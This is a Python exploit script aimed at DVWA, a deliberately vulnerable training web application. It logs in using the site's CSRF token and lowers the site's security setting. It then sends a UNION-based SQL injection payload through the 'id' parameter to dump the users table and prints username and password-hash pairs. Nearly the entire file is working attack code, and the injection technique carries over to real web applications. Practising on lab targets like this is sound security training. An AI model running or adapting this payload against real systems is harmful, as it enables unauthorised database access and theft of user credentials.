import requests
import argparse
import sys
from bs4 import BeautifulSoup

# Login to DVWA using user given URL and credentials
def login(url, username, password):
    session = requests.session()
    # GET request first to get CSRF token 
    getLoginPage = session.get(url + "/login.php")
    soup = BeautifulSoup(getLoginPage.text, "lxml")
    csrf_token = soup.find('input', {'name':'user_token'})['value']
    # Logging in after token is received
    session.post(url + "/login.php", data={"username":username, "password":password, "Login":"Login", "user_token":csrf_token})
    changeSecurityLevel(url, session)

# Chancing security level to low
def changeSecurityLevel(url, session):
    securityPageGet = session.get(url + "/security.php")
    soup = BeautifulSoup(securityPageGet.text, "lxml")
    # GET request to /security.php to get CSRF token
    csrf_token = soup.find('input', {'name':'user_token'})['value']
    data = {"security":"low", "seclev_submit":"Submit", "user_token":csrf_token}
    # Changing security level to low after token is received
    session.post(url + "/security.php", data=data)
    exploit(url, session)

# Exploiting SQL injection
def exploit(url, session):
    # Payload
    payload = "1' UNION ALL SELECT CONCAT(0x207573657220,IFNULL(CAST(`user` AS NCHAR),0x20),0x2075736572656e6420,IFNULL(CAST(avatar AS NCHAR),0x20),0x657373636e61,IFNULL(CAST(failed_login AS NCHAR),0x20),0x657373636e61,IFNULL(CAST(first_name AS NCHAR),0x20),0x657373636e61,IFNULL(CAST(last_login AS NCHAR),0x20),0x657373636e61,IFNULL(CAST(last_name AS NCHAR),0x20),0x207061737320,IFNULL(CAST(password AS NCHAR),0x20),0x2070617373656e64,IFNULL(CAST(user_id AS NCHAR),0x20),0x716b716b71),NULL FROM dvwa.users#"
    data = {"id":payload, "Submit":"Submit"}
    # Sending payload in a request and saving the result
    sqliData = session.get(url + "/vulnerabilities/sqli/", params=data)
    soup = BeautifulSoup(sqliData.text, "lxml")
    # Saving data that contains table data inside pre-tags
    dbData = str(soup.findAll('pre')).split("</pre>,")
    parseCredentials(dbData)

	# Printing out username + hash combination for each record in table
def parseCredentials(dbData):
    print("Username + hash:")
    for record in dbData:
        try:
            print(str(str(record).split("user ")[1].split(" userend")[0]) + ":" + str(record).split("pass ")[1].split(" passend")[0]) 
        except:
            continue

# Script starts here
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="""Script exploits SQL Injection vulnerability in DVWA through id parameter.
    Requires DVWA base URL, username and password.
    Example: python dvwa-sql-exploit.py -user admin -p password -u http://172.17.0.2""")
    parser.add_argument("-user", help="Username", default="admin")
    parser.add_argument("-u", help="URL")
    parser.add_argument("-p", help="Password", default="password")
    args = parser.parse_args()
    
    # If argument is missing, script stops
    if args.user is None:
        parser.print_help()
        sys.exit()
    if args.u is None:
        parser.print_help()
        sys.exit()
    if args.p is None:
        parser.print_help()
        sys.exit()
    # If arguments are there continue to login 
    login(args.u, args.user, args.p)
